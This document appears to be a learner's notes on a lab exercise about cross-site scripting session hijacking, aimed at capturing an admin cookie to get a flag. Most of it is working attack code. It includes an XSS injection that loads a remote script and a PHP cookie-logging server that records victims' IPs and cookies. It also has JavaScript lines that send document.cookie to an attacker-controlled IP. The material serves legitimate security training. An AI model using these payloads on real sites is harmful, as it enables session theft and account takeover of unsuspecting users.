# [Session Hijacking](Cross-Site%20Scripting%20(XSS)/Session%20Hijacking.md)
### Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.

![](Screenshot%202026-06-27%20at%2015.19.47.png)

```html
"><script src=http://10.10.15.121></script>
```

```php
<?php 
if (isset($_GET['c'])) { 
	$list = explode(";", $_GET['c']); 
	foreach ($list as $key => $value) { 
		$cookie = urldecode($value); 
		$file = fopen("cookies.txt", "a+"); 
		fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n"); 
		fclose($file);
	} 
}
?>
```

create .js file and put in there 2 payloads:

```js
document.location='http://10.10.16.78/index.php?c='+document.cookie;  
new Image().src='http://10.10.16.78/index.php?c='+document.cookie;
```

Now just run the server and use the same script payload, just adding /script.js next to our ip.  
`“><script src=http://10.10.16.78/script.js></script>`
![](Screenshot%202026-06-27%20at%2015.39.23.png)
![](Screenshot%202026-06-27%20at%2015.43.20.png)
![](Screenshot%202026-06-27%20at%2015.43.37.png)
